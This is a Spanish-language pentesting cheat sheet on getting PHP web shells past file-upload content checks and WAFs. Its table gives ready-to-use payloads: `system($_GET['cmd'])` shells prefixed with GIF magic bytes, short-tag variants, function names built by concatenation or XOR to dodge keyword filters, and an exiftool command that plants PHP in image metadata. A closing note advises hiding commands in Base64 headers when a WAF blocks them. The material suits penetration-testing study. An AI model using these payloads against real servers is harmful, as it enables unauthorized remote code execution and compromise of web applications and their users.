---
aliases: null
tags:
  - type/technique
  - vuln/file-upload
  - technique/execution
  - asset/web-app
type: SubCheatSheet
linked:
  - '[[File Upload - Vulnerabilidades]]'
---
# File Upload - Bypass de Contenido

***

## Cheatsheet

|               **Vector o Técnica**               |                                                                                 **Descripción y Comportamiento**                                                                                  | **Ejemplo de Ejecución / Payload**                                                                                                                                         |
|:------------------------------------------------:|:-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------:| -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
|  <br>**Falsificación de Firmas (Magic Bytes)**   |             <br>Engaña a validaciones internas como `mime_content_type()` o el comando `file` de Linux insertando la cabecera hexadecimal de una imagen legítima en la primera línea.             | <br>`GIF89a;`<br><br>`<?php system($_GET['cmd']); ?>`<br><br>                                                                                                              |
|    <br>**Evasión de Etiquetas (Short Tags)**     |               <br>Los WAF básicos suelen buscar la cadena literal `<?php`. Si el servidor (ej. `php.ini`) tiene habilitado `short_open_tag`, se pueden usar sintaxis alternativas.                | <br>`<?= system($_GET['c']); ?>`<br>`<? system($_GET['c']); ?>`<br>`<script language="php">system($_GET['c']);</script>`<br><br>                                           |
| <br><br>**Ofuscación de Funciones (WAF Bypass)** |                     <br><br>Evitar escribir palabras clave bloqueadas como `system`, `exec` o `shell_exec`. Se construyen las funciones dinámicamente en tiempo de ejecución.                     | <br>`$cmd = 's'.'y'.'s'.'t'.'e'.'m';`<br>`$cmd($_GET['c']);`<br><br>--- o usando variables ---<br>`$a=$_GET['a']; $a($_GET['c']);` _(llamando a `?a=system&c=id`)_<br><br> |
|      <br>**Inyección en Metadatos (Exif)**       |             <br>El archivo es una imagen real que pasa filtros estrictos como `getimagesize()`, pero oculta el código en los campos de metadatos (como el Comentario o el Copyright).             | <br>Usando la herramienta de terminal:<br><br>`exiftool -Comment="<?php system('id'); ?>" foto.jpg`<br><br>                                                                |
|   <br>**Evasión de Bloqueo de Alfanuméricos**    | <br>WAFs muy agresivos bloquean cualquier letra o número dentro de un bloque PHP. Se usan operaciones a nivel de bits (XOR) o codificación para generar letras a partir de caracteres especiales. | <br>`$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // Genera "assert"`<br><br>                                                               |
|     <br>**Políglotas Avanzados (Polyglots)**     |              <br>Archivos que son válidos en múltiples formatos al mismo tiempo. Pasan validaciones estructurales de imagen profundas y se ejecutan sin romper el intérprete de PHP.              | <br>Requiere scripts como `jhead` o herramientas a medida para inyectar el payload dentro de un segmento DQT o COM de un JPEG sin corromper la imagen.<br><br>             |
^fu-contenido

```ad-note
La ofuscación de funciones (la tercera fila) es vital. Muchas veces subís la shell y el servidor te la acepta, pero cuando intentás ejecutar un comando como `ls` o `id` (ej. navegando a `tushell.php?cmd=id`), el WAF intercepta la petición HTTP y te bloquea. En esos casos, ofuscar el payload o pasar los comandos en Base64 por un header HTTP personalizado suele salvar el día.
```


___
